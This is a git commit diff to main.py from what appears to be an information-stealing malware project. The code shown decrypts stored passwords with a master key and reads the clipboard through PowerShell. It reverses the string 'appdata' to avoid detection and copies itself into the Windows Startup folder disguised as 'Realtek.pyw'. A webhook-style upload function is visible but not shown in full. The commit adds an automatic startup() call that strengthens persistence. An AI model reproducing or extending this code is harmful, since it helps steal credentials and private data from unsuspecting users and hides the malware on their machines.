cbf0d93b32299e30763313c671eea452d88c7d24
TheCuteOwl <114611129+TheCuteOwl@users.noreply.github.com>
2023-10-24 14:54:48 +0200

    Update main.py

--- main.py
+++ main.py
@@ -250,19 +250,7 @@ def decrval(buff, master_key=None):
         return decrypted_pass
     
 
-def check_python_or_convert(file_path):
-    _, file_extension = os.path.splitext(file_path)
 
-    if file_extension == ".py":
-        with open(file_path, "r") as file:
-            first_line = file.readline()
-            if first_line.strip() == "#!/usr/bin/env python" or first_line.strip() == "#!/usr/bin/python":
-                return file_path  # It's already a Python script, so keep the .pyw extension
-
-    file_path = os.path.splitext(file_path)[0] + ".exe"
-
-    return file_path
-    
 def Clipboard():
     try:
         command = 'Get-Clipboard -TextFormatType Text'
@@ -274,7 +262,7 @@ def Clipboard():
 
 apppp = 'atadppa'
 path = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"
-path = check_python_or_convert(path)
+
 def get_random_path():
     possible_paths = [os.getenv("APPDATA"), os.getenv("LOCALAPPDATA")]
     chosen_path = random.choice(possible_paths)
@@ -294,6 +282,18 @@ def create_copy_and_return_new_path():
     shutil.copy2(current_script_path, new_path)
     
     return new_path
+
+def check_python_or_convert(file_path):
+    
+    
+    _, file_extension = os.path.splitext(file_path)
+
+    if ".py" in file_path:
+        return file_path 
+
+    file_path = os.path.splitext(file_path)[0] + ".exe"
+
+    return file_path
 
 def deobf(encrypted_text, key):
     decrypted = [0] * 256
@@ -333,13 +333,14 @@ def startup():
     apppp = 'atadppa'
     path = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"
     path = check_python_or_convert(path)
-
     if not isfile(path):
         copy(__file__, path)
 
     else:
         if __file__.replace('\\', '/') != path.replace('\\', '/'):
             pass
+
+startup()
 
 def LoadUrlib(hook, data='', files='', headers=''):
     
